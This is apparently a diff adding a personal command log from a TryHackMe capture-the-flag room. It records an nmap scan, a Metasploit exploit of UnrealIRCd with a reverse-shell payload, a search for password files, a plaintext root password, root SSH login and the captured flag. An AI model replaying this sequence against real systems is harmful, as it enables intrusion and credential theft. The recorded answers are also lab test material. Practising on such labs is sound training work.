@@ -1,0 +1,24 @@
+10.113.138.82
+nmap -sV -sC -vv -p- -oN scan.txt 10.113.138.82
+searchsploit openssh
+searchsploit UnrealIRCd
+msfconsole
+
+64  search unrealircd
+65  use 0
+66  show options
+67  setg lhost 192.168.142.19
+68  setg rhosts 10.113.138.82
+69  show options
+70  show payloads
+71  set payload cmd/unix/reverse
+72  show options
+73  exploit
+find / -name password* 2>/dev/null
+cat /etc/password.txt
+root:PDLrCVl1pLD91U0JMmCz
+ssh root@10.113.138.82
+cat /root/flag.txt 
+THM{Escalat1on-D0ne}
+74  history
+
